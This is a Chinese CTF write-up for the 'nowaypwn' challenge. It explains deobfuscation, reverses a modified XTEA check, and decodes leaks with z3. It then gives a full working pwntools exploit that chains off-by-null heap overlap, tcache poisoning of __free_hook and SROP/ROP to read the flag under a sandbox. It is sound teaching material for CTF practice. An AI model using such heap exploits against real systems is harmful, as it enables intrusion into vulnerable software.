> 原文链接: https://www.anquanke.com//post/id/249647 


# 第五届XMan选拔赛 nowaypwn Writeup


                                阅读量   
                                **21091**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01bbf96509dbfdebc8.png)](https://p3.ssl.qhimg.com/t01bbf96509dbfdebc8.png)



## nowaypwn

### <a class="reference-link" name="%E5%A4%84%E7%90%86%E6%B7%B7%E6%B7%86"></a>处理混淆

题目存在混淆，导致 IDA 未能识别出完整的函数

[![](https://p0.ssl.qhimg.com/t016cecccf0d17eb74d.png)](https://p0.ssl.qhimg.com/t016cecccf0d17eb74d.png)

我们这里直接 nop 掉这部分代码后得到的代码，与原来的代码是等价的

[![](https://p2.ssl.qhimg.com/t012d24a793a43f7226.png)](https://p2.ssl.qhimg.com/t012d24a793a43f7226.png)

但是函数的识别还没有自动变更，我们到函数首部按 U 取消定义，然后再按 P 让 IDA 重新识别函数，伪代码就可以正常显示，类似的地方还有好几处，我们逐个处理即可。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fd0405e8e59750e9.png)

对函数进行重命名、恢复堆块结构体信息，此时的伪代码就相对来说容易阅读一些了。

### <a class="reference-link" name="%E5%88%86%E6%9E%90%E9%AA%8C%E8%AF%81%E5%87%BD%E6%95%B0"></a>分析验证函数

进入后续堆题的前提是通过题目的验证函数，否则就会一直卡在死循环处。

[![](https://p1.ssl.qhimg.com/t012afa2656ce44f730.png)](https://p1.ssl.qhimg.com/t012afa2656ce44f730.png)

验证函数主要是一个 xtea 函数对输入的内容进行加密，只需要加密后的数据与题目内置的一致即可。但是在做题初期没有注意到题目中的混淆，导致在这部分验证卡了很久。

[![](https://p4.ssl.qhimg.com/t01c3a982b04e9ab7b6.png)](https://p4.ssl.qhimg.com/t01c3a982b04e9ab7b6.png)

实际上这部分代码中，前半部分都是标准的 xtea 加密，但是实际上真正在工作进行加密的是后半部分的魔改 xtea 加密，而且其加密过程与第一部分都没有任何关联，所以这里并不是叠加进行了两次 xtea 加密，而是只进行了后一次循环次数为 17 的 xtea 加密。

```
def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    delta = 0x14872109
    sum = c_uint32(0)
    n = 17
    for i in range(n):
        sum.value += delta
    w = [0, 0]
    while (n &gt; 0):
        z.value -= (((y.value &lt;&lt; 4) ^ (y.value &gt;&gt; 5)) + y.value) ^ (sum.value + k[(sum.value &gt;&gt; 11) &amp; 3])
        sum.value -= delta
        y.value -= (((z.value &lt;&lt; 4) ^ (z.value &gt;&gt; 5)) + z.value) ^ (sum.value + k[sum.value &amp; 3])
        n -= 1
    w[0] = y.value
    w[1] = z.value
    return w
key = [0x28371234, 0x19283543, 0x19384721, 0x98372612]
v = [0x105d191e, 0x98e870c8]
dec = decipher(v, key)
```



## 分析堆题部分

先还原结构体方便后续查看伪代码

[![](https://p1.ssl.qhimg.com/t01c5dee8f85506b8fb.png)](https://p1.ssl.qhimg.com/t01c5dee8f85506b8fb.png)

[![](https://p4.ssl.qhimg.com/t01b04f2df1a1040dac.png)](https://p4.ssl.qhimg.com/t01b04f2df1a1040dac.png)

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"></a>程序函数分析

#### <a class="reference-link" name="%E6%B2%99%E7%AE%B1%E4%BF%9D%E6%8A%A4"></a>沙箱保护

题目开启了沙箱，防止直接使用 execve 来执行命令，这意味着这道题需要使用 orw 来拿到 flag

[![](https://p3.ssl.qhimg.com/t014cc2f7ea2ec525fc.png)](https://p3.ssl.qhimg.com/t014cc2f7ea2ec525fc.png)

#### <a class="reference-link" name="add%20%E5%8A%9F%E8%83%BD"></a>add 功能

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0161c5d233e2e62181.png)

只允许申请 17 个堆块，并且申请堆块的 size 不得大于 0x200，这限制了我们不能使用 largebin 相关的攻击方法，但是只需要把 Tcache 填满，还是可以利用 unsortedbin 的。

#### <a class="reference-link" name="delete%20%E5%8A%9F%E8%83%BD"></a>delete 功能

[![](https://p0.ssl.qhimg.com/t01b515fb750661112d.png)](https://p0.ssl.qhimg.com/t01b515fb750661112d.png)

允许 free 一个堆块，并且在 free 之后将指针置为 0。这里就是正确的释放方法，可以避免 double free 利用。

#### <a class="reference-link" name="show%20%E5%8A%9F%E8%83%BD"></a>show 功能

[![](https://p2.ssl.qhimg.com/t01e350617b7154d646.png)](https://p2.ssl.qhimg.com/t01e350617b7154d646.png)

[![](https://p0.ssl.qhimg.com/t013d4f8fc78c677839.png)](https://p0.ssl.qhimg.com/t013d4f8fc78c677839.png)

允许输出堆块内容中前 8 个字节的数据，但输出的数据进行过加密，不过我们可以直接使用 z3 进行解密，解密的方法可以参照 2021 强网杯 babypwn 这题。

需要注意的问题就是在移位过程中需要注意是逻辑右移还是算数右移，这部分内容可以参照 [津门杯线下 AWD hpad Writeup](https://www.anquanke.com/post/id/243013) 里面的解密操作

```
def decode(data):
    solver = Solver()
    a1 = BitVec('a1', 32)
    x = a1
    for _ in range(2):
        x ^= (32 * x) ^ LShR((x ^ (32 * x)), 17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)), 17)) &lt;&lt; 13)
    solver.add(x == int(data, 16))
    solver.check()
    ans = solver.model()
    return p32(ans[a1].as_long())
```

#### <a class="reference-link" name="edit%20%E5%8A%9F%E8%83%BD"></a>edit 功能

[![](https://p0.ssl.qhimg.com/t01a327e76b84695d68.png)](https://p0.ssl.qhimg.com/t01a327e76b84695d68.png)

[![](https://p0.ssl.qhimg.com/t016e72c0cfc25e6101.png)](https://p0.ssl.qhimg.com/t016e72c0cfc25e6101.png)

利用 edit 功能可以使得堆块外的内容变成 NULL 数据，这里我们只需要构造当前堆块的下一个堆块的 size 内容是 0x111 或者 0x211 就可以造成 off by null。这里就是程序中唯一的漏洞点，我们就是利用这里最后达到控制程序流程的目的。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

#### <a class="reference-link" name="1.off%20by%20null%20%E6%9E%84%E6%88%90%E5%A0%86%E9%87%8D%E5%8F%A0"></a>1.off by null 构成堆重叠

这部分的操作其实就是堆题中 off by null 的利用方式的一种变形，而这道题的 show 函数是可以拿到堆上的残留数据的，我们可以借此计算得到 heap_base 和 libc_base，所以不需要堆风水来构造，相对来说要容易得多，具体的内容我这里就不再重复介绍，可以看我之前写的文章[ glibc 2.29-2.32 off by null bypass](https://www.anquanke.com/post/id/236078)，主要的思路就是覆盖 prev_inuse，然后利用 unsortedbin 的 unlink 的机制来触发堆块重叠。

#### <a class="reference-link" name="2.UAF%20%E5%8A%AB%E6%8C%81%20Tcache%20next%20%E6%8C%87%E9%92%88"></a>2.UAF 劫持 Tcache next 指针

堆重叠之后，就可以利用 UAF 来修改 tcache next 指针到 __free_hook，在通过两次申请就可以取出 __free_hook 这个堆块。如果是 glibc2.28 及以上版本，需要考虑让 tcache-&gt;counts[idx] &gt; 0 才能够取出。

#### <a class="reference-link" name="3.%E5%8A%AB%E6%8C%81%20__free_hook"></a>3.劫持 __free_hook

取出__free_hook 堆块后再修改为 setcontext + 53，然后在堆块上布局数据，free 那个堆块来触发 SROP。由于版本较低，所以也不需要借助 gadget 来转移 rdi 到 rdx。

#### <a class="reference-link" name="4.%E4%BC%98%E5%8C%96%20exp"></a>4.优化 exp

这道题由于没有回显，所以我们不能根据回显的内容来判定程序是否执行完上一个功能。这时候一些函数（如 read）由于并没有读取到相应的字节数，可能会把我们两次不同输入识别成同一次，造成 io 混乱，在远程攻击的时候，由于延迟等情况时有发生，这种问题必须要重视，否则 exp 攻击成功率很低。

##### <a class="reference-link" name="1.%E4%BD%BF%E7%94%A8%20sleep"></a>1.使用 sleep

这种方法是我最早采用的，就是在使用某一个功能之前加一个延迟，使得远程的程序处理完毕后再进行下一个操作。使用这种方法在本地基本上就不会有问题，但是在攻击远程的时候还常常会因为延迟等原因导致攻击失败，所以我并不推荐。

##### <a class="reference-link" name="2.%E6%8A%8A%20read%20%E6%89%80%E6%9C%89%E9%9C%80%E8%A6%81%E7%9A%84%E5%AD%97%E8%8A%82%E5%86%99%E6%BB%A1"></a>2.把 read 所有需要的字节写满

这个方法在有些情况下是可用的，比如需要写入的位置写满都不会影响到后续流程，当可用的时候，使用这种方法是最好的。而且在调试过程中也可以加快速度，避免等待。

比如在这个程序中常用的这个函数

[![](https://p2.ssl.qhimg.com/t01e2b47105359398c8.png)](https://p2.ssl.qhimg.com/t01e2b47105359398c8.png)

我们只需要在发送数据的时候，将 0x10 长度的数据发送完整（发送的内容和读取的字节数一致）就不会出现 io 混乱的问题，其他地方的操作也是类似。

[![](https://p0.ssl.qhimg.com/t01657b77c4ffc3f4d9.png)](https://p0.ssl.qhimg.com/t01657b77c4ffc3f4d9.png)

### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *
from z3 import *

elf = None
libc = None
file_name = "./nowaypwn"


# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    pwn(sh, elf, libc)
    flag = get_flag(sh)
    return flag


def decipher(v, k):
    y = c_uint32(v[0])
    z = c_uint32(v[1])
    delta = 0x14872109
    sum = c_uint32(0)
    n = 17
    for i in range(n):
        sum.value += delta
    w = [0, 0]
    while (n &gt; 0):
        z.value -= (((y.value &lt;&lt; 4) ^ (y.value &gt;&gt; 5)) + y.value) ^ (sum.value + k[(sum.value &gt;&gt; 11) &amp; 3])
        sum.value -= delta
        y.value -= (((z.value &lt;&lt; 4) ^ (z.value &gt;&gt; 5)) + z.value) ^ (sum.value + k[sum.value &amp; 3])
        n -= 1
    w[0] = y.value
    w[1] = z.value
    return w


def sendint(idx):
    data = str(idx)
    sh.send(data.ljust(0x10, '\x00'))


def choice(idx):
    sendint(idx)


def decode(data):
    solver = Solver()
    a1 = BitVec('a1', 32)
    x = a1
    for _ in range(2):
        x ^= (32 * x) ^ LShR((x ^ (32 * x)), 17) ^ (((32 * x) ^ x ^ LShR((x ^ (32 * x)), 17)) &lt;&lt; 13)
    solver.add(x == int(data, 16))
    solver.check()
    ans = solver.model()
    return p32(ans[a1].as_long())


def add(size):
    choice(4)
    sendint(size)


def edit(idx, content):
    choice(1)
    sendint(idx)
    sh.send(str(content))


def show(idx):
    choice(2)
    sendint(idx)
    v1 = decode(sh.recvuntil('\n', drop=True))
    v2 = decode(sh.recvuntil('\n', drop=True))
    v1 += v2
    log.hexdump(v1)
    return v1


def delete(idx):
    choice(3)
    sendint(idx)


def pwn(sh, elf, libc):
    context.log_level = "debug"
    key = [0x28371234, 0x19283543, 0x19384721, 0x98372612]
    v = [0x105d191e, 0x98e870c8]
    dec = decipher(v, key)
    sh.sendafter('name:', 'a' * 0x10)
    sh.sendafter('key:', 'b' * 0x20)
    sh.sendafter('secret!:', p32(dec[0]) + p32(dec[1]) + 'c' * 0x10)
    for i in range(10):
        add(0x108)

    for i in range(9):
        delete(8 - i)

    for i in range(9):
        add(0x108)

    sh.recvuntil('\n')
    data = show(1)
    heap_base = u64(data) - 0x10f0
    log.success("heap_base:\t" + hex(heap_base))

    data = show(7)
    malloc_hook_addr = u64(data) - 624 - 0x10
    log.success("malloc_hook_addr:\t" + hex(malloc_hook_addr))
    libc_base = malloc_hook_addr - libc.sym['__malloc_hook']
    log.success("libc_base:\t" + hex(libc_base))
    # 7 8 0 1 2 3 4 5 6 9
    edit(7, 'a' * 0x100 + p64(0x110))
    edit(0, 'a' * 0xF0 + p64(0) + p64(0x121) + p64(0))
    edit(8, 'a' * 0x108)
    heap8_addr = heap_base + 0xdc0
    target = heap8_addr + 0x10
    FD = target - 0x18
    BK = target - 0x10
    edit(8, p64(FD) + p64(BK) + p64(heap8_addr - 0x10) + 'a' * (0x100 - 0x18) + p64(0x110))
    for i in range(6):
        delete(i + 1)
    delete(9)

    delete(7)
    for i in range(7):
        add(0x108)  # 1 2 3 4 5 6 7

    add(0x108)  # 9
    add(0x108)  # 10

    delete(1)
    delete(8)
    free_hook_addr = libc_base + libc.sym['__free_hook']
    setcontext_addr = libc_base + libc.sym['setcontext'] + 53
    edit(10, p64(free_hook_addr) + '\x00' * 0x100)

    add(0x108)  # 1
    add(0x108)  # 8 #get free_hook
    add(0x200)  # 11

    pop_rdi_addr = libc_base + 0x2155f
    pop_rsi_addr = libc_base + 0x23e6a
    pop_rdx_addr = libc_base + 0x1b96
    pop_rax_addr = libc_base + 0x439c8
    syscall_addr = libc_base + 0xd2975

    # SROP
    fake_frame_addr = heap_base + 0x1750
    frame = SigreturnFrame()
    frame.rdi = fake_frame_addr + 0xF8 + 0x10
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x20 + 0x8
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,
        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]
    payload = str(frame).ljust(0xF8, '\x00') + '\x00' * 0x10 + 'flag.txt' + '\x00' * 0x8 + '\x00' * 0x8 + flat(rop_data)
    edit(11, payload.ljust(0x200, '\x00'))
    edit(8, p64(setcontext_addr) + '\x00' * 0x100)
    # gdb.attach(sh, "b free")
    delete(11)
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```



## 总结

这道题的主要内容和 2021 强网杯 babypwn 那题一模一样，包括沙箱限制、堆块申请限制、利用方式、libc 文件都一样，就是原题套了个验证函数。

但是这道题我认为还有一些地方可以改善的

**1.提供 libc 文件**

虽然出题人的本意就是不提供 libc 文件，并且这题可以根据无 double free 报错和存在 tcache 大概可以猜测到是 glibc2.27 1.4 之前的版本，但是我还是建议堆题都要提供 libc 文件。我个人认为，任何堆题（除非为了考察 ret2_dlresolve）不给出 libc 文件就是耍流氓，是在浪费做题人的时间，针对于不同版本的 glibc 来针对性的写 exp 这都是基本操作，不给 libc 让程序中不确定因素过多（尤其是堆题）。

**2.提供 flag 文件名**

开了沙箱之后这道题注定是需要用像 orw 这样方法来拿到 flag 文件的，但是这道题却没有提供 flag 文件名，虽然这也是比赛中常见的情况，一般都是猜测名称为 flag 或 flag.txt，但是我认为如果在题目描述中告知 flag 文件名会更方便做题和复现，何况这道题还没有提供 libc。不过，这道题由于只禁用了 execve，其实还可以考察 sys_getdents 这样的探测路径的方法，并且把 flag 的文件名改的复杂一些。

**3.增加 PWN 方向的难度**

就这道题而言，是由强网杯那题改写的，那应该在原题上有所提升。我认为应该思考如何在原题的基础上加强难度和利用限制。这样增加一个验证函数和混淆代码可以考察做题人的 RE 能力，但同时不应该偏离 PWN 这个题目分类，也应当增加的是 PWN 漏洞利用的难度，以这道题的限制条件而言，完全可以把 glibc 换成 2.31 或者 2.32 这样的高版本，来考察做题人对新版本的检测和保护的绕过方法。



## 反思

虽然我在比赛结束前一个多小时就已经在本地打通，但是直到比赛结束都没有拿到 flag。在最后一个小时内我对各个版本的 libc 进行替换测试，并且逐一测试 flag 文件名（flag / flag.txt），但最后还是因为 exp 写法不够完美导致程序 io 混乱，使得当我的 libc 版本和远程已经一致的情况下，远程仍然没有打通。以后在比赛过程中应当注意时刻测试 libc 版本和注意延迟问题，当 exp 编写完成后，再回头来调整绕过手法就会浪费大量的时间。
